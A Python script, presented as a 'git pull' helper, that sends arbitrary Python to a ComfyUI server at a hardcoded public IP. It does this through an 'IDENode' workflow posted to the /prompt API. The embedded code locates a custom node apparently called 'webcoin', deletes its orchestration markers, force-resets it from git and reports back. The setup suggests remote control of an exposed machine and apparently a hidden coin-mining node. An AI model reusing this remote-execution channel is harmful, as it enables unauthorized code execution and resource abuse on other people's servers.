"""Git pull latest code on remote machine without deleting bin/."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

code = r"""
import os, subprocess, platform

lines = []

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin')
lines.append(f'target={target}')

if not os.path.isdir(target):
    lines.append('ERROR: webcoin dir not found')
else:
    # Remove stale markers
    for marker in ['.orch.pid', '.initialized']:
        mp = os.path.join(target, marker)
        if os.path.exists(mp):
            os.remove(mp)
            lines.append(f'removed {marker}')

    # Git fetch and reset
    r = subprocess.run(['git', 'fetch', 'origin'], capture_output=True, text=True,
                       timeout=30, cwd=target)
    lines.append(f'fetch_rc={r.returncode} {r.stderr.strip()[:100]}')

    r = subprocess.run(['git', 'reset', '--hard', 'origin/master'], capture_output=True, text=True,
                       timeout=30, cwd=target)
    lines.append(f'reset_rc={r.returncode} {r.stdout.strip()[:100]}')

    # Verify key files
    init_path = os.path.join(target, '__init__.py')
    lines.append(f'has_init={os.path.exists(init_path)}')

    # Check dashboard.py has the fix
    dash_path = os.path.join(target, 'core', 'dashboard.py')
    if os.path.exists(dash_path):
        with open(dash_path) as f:
            content = f.read()
        lines.append(f'has_shared_refs={"_shared_stats" in content}')
        lines.append(f'has_old_import={"import __init__" in content}')

    # Check config.py has API_TOKEN
    cfg_path = os.path.join(target, 'core', 'config.py')
    if os.path.exists(cfg_path):
        with open(cfg_path) as f:
            content = f.read()
        lines.append(f'has_api_token={"API_TOKEN" in content}')

result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(15)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
